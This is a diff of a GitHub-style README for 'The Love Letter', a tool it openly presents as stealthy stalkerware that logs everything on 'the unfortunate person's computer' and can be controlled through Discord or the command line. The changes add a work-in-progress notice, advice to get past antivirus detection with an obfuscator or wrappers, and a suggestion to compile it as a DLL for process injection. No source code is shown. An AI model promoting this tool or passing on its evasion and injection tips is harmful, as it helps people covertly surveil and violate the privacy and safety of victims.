@@ -10,6 +10,7 @@
 
 <br/>
 
+# **This is a work in progress, some features still don't work.**
 
 ## What is The Love Letter?
 An all-around tool for afk stalking ❤️ logs everything on the unfortunate person's computer from top to bottom while being as stealthy as possible, it contains the complete set of tools you need for stalking
@@ -34,11 +35,12 @@ Explore the source code 👇🏻
  <img src="Repo/Images/0.png"/>
 </p>
 
-4. (Optional) Set up a Discord bot if you want the controller to work on Dicord, else you can just controll it via commandline, more info [here!](Controller/README.md)
+4. **(Optional)** Set up a Discord bot if you want the controller to work on Dicord, else you can just controll it via commandline, more info [here!](Controller/README.md)
 5. Compile on Release, not on Debug
 6. Star the repo (important 😉)
+7. **(Optional)** Got detected by AV? Use [an obfuscator](https://github.com/mkaring/ConfuserEx) or better yet, use wrappers
 
-As simple as that.
+As simple as that. You may also compile this as a DLL and inject on processes but that would be your choice.
 # Contributions
 This project is made during my free time, PRs are more than welcome 😄 I'd be more than happy if you star this repo! Motivates me to keep maintaining this 👍🏻
 # License
